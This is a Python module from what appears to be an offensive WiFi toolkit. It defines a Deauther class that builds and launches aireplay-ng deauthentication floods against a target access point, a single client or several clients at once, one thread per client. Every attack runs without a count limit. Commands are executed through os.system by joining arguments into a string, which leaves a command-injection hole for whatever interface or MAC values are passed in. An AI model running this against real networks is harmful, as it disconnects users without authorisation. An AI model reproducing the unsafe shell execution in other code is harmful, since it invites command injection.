import fcntl
import os
import select
import shlex
import subprocess
import time
from threading import Thread

from modules.decorator import abort_information
from modules.menu_helper import print_message


class Deauther:
    """
    main deauther that runs aireplay commands
    """
    def __init__(self,interface,target_ap_address,client=None,clients=None):
        self.interface = interface
        self.target_ap_address = target_ap_address
        self.client = client
        self.clients = clients

    @abort_information(two_times=False)
    def start_broadcast_deauth_attack(self):
        """
        broadcast deauth on broadcast channel
        """
        command = self.command_builder()
        launch_command(command)
        # self.delete_old_file()        

    @abort_information(two_times=True)
    def start_multi_client_deauth_attack(self):
        """
        deauth each client in list separately
        """
        thread_list = [] 
        print_message(f'Following clients will be disconnected: {self.clients}','yellow',instant=True)
        for client in self.clients:
            command = self.command_builder(client)
            t = Thread(target=launch_command,args=(command,),daemon=True)
            t.start()
            thread_list.append(t)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt: 
            pass

    @abort_information(two_times=False)
    def start_specific_client_deauth_attack(self):
        """
        deauth one specific client
        """
        command = self.command_builder(client_mac=self.client) 
        launch_command(command)

    def command_builder(self,client_mac=None):
        command = [
            'aireplay-ng',
            self.interface,
            # 'wlan0',
            "--deauth",'0',
            '-x','1',
            "-a",str(self.target_ap_address)
            # "-a",'D4:21:22:77:93:4B'
        ]
        if client_mac:
            command.extend(["-c",str(client_mac)])
        return command

def launch_command(command):
    def workaround(command):
        import os
        mcommand = " ".join(command)
        os.system(mcommand)
    workaround(command)
 

